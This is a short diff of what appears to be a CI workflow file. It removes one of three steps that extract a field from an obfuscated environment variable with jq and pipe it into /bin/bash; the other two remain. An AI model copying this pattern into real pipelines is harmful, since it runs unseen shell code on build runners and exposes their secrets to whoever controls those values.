@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hdiiy10521" | jq -r .f3 | /bin/bash
           printf '%s' "$fwlnu36" | jq -r .uem859 | /bin/bash
-          echo $k424 | jq -r .qblwv213 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
